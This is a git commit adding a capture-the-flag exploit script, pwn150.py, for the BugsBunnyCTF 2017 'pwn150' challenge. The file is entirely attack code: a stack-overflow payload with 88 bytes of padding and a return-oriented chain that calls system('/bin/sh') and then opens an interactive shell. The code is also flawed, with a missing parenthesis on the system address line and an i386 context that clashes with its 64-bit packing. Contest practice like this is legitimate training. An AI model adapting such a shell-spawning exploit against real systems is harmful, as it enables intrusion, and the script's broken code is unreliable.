f56457a05fd3bcd6d8d6f07879f1d84fdc4ee949
chamli mohamed <mohamed.chamli@esprit.tn>
2017-08-01 02:34:20 +0200

    Create pwn150.py

---
+++ BugsBunnyCTF_2017/pwn150.py
@@ -0,0 +1,21 @@
+#!/usr/bin/env python
+#TnMch
+
+from pwn import *
+
+context(arch='i386',os='linux')
+local = True
+
+if local: p = process("./pwn150")
+else: p = remote("127.0.0.1", 5253)
+
+system = p64(0x40075f
+binsh = p64(0x4003ef)
+
+payload = ""
+payload += "A"*88
+payload += p64(0x00400883)
+payload += binsh
+payload += system
+p.sendline(payload)
+p.interactive()
